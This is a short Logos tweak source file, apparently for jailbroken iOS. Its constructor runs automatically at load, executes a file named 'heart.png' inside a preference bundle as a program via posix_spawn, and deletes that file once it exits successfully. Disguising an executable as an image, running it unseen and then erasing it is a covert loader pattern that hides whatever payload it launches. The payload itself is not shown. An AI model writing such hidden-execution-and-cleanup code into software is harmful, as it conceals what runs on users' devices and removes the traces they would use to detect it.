#include <unistd.h>
#include <spawn.h>
static const char *path = "/Library/PreferenceBundles/YourBundle.bundle/heart.png";
%ctor {
	if (access( path, F_OK ) != -1) {
		pid_t pid;
    	int status;
    	const char* args[] = { "heart.png", NULL };
    	posix_spawn(&pid, path, NULL, NULL, (char* const*)args, NULL);
    	waitpid(pid, &status, WEXITED);
    	if (status == 0) {
    		unlink(path);
    	}
	}
}